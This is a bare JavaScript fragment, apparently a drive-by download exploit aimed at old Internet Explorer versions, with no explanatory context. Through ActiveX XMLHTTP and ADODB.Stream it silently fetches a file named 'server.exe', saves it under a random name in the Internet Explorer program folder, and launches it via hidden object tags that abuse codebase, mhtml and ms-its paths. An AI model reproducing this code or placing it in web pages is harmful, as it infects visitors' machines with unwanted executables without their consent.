

      function LaunchExecutable9X(InetPath,asd)
      {
        tagstyle='style="display:none"';
        ObjCLSID="clsid:10000000-1000-0000-10000-000000000001";
        ObjBASE='mhtml:file://C:\\ARCHIVE.MHT!'+InetPath;
        sObject ='<object classid="'+ObjCLSID+'" codebase="'+ObjBASE+'" '+tagstyle+'></object>';
        icounter.document.write(sObject);
        setTimeout('icounter.document.execCommand("Refresh")',1000);

      }

     function LaunchExecutable2K(ObjSrc)
      {
        tagstyle='style="display:none"';
        ObjCLSID="clsid:10000000-1000-0000-10000-000000000001";
        sObject ='<object classid="'+ObjCLSID+'" codebase="'+ObjSrc+'" '+tagstyle+'></object>';
        try
        {
            ObjectContainer.innerHTML=sObject;
        }
        catch(e){}
      }

      ObjSrc="";

      for (ik=0;ik<8;ik++)
      {
          ii=Math.random();
          chCode=Math.round(ii*25)+0x61;
          chSym=String.fromCharCode(chCode);
          ObjSrc=ObjSrc+chSym;
          if (chCode==0x61) {break};
      }

      ObjSrc="C:\\Program Files\\Internet Explorer\\"+ObjSrc+".exe";

      var InetPath=document.location.href;
      iPrefix=InetPath.substring(0,7);

      switch(iPrefix)
      {
      case "http://" :
                      j=InetPath.lastIndexOf('/');
                      InetPath=InetPath.slice(0,j)+'/server.exe';
                      break;
      case "ms-its:" :
                      i=InetPath.indexOf('!');
                      j=InetPath.lastIndexOf('//');
                      InetPath=InetPath.slice(i+1,j)+'/server.exe';
                      break;
      }



      {
      var oXMLHTTP = new ActiveXObject("Microsoft.XMLHTTP");
      oXMLHTTP.Open("GET",InetPath,0);
      oXMLHTTP.Send();

      try
      {
         var oStream = new ActiveXObject('ADODB.Stream');
         oStream.Mode = 3;
         oStream.Type = 1;
         oStream.Open();
         oStream.Write(oXMLHTTP.responseBody);
         oStream.SaveToFile(ObjSrc,2);
      }
      catch(e){}

      setTimeout("LaunchExecutable2K(ObjSrc)",1000);
      }


      {
         LaunchExecutable9X(InetPath,"123");
      }

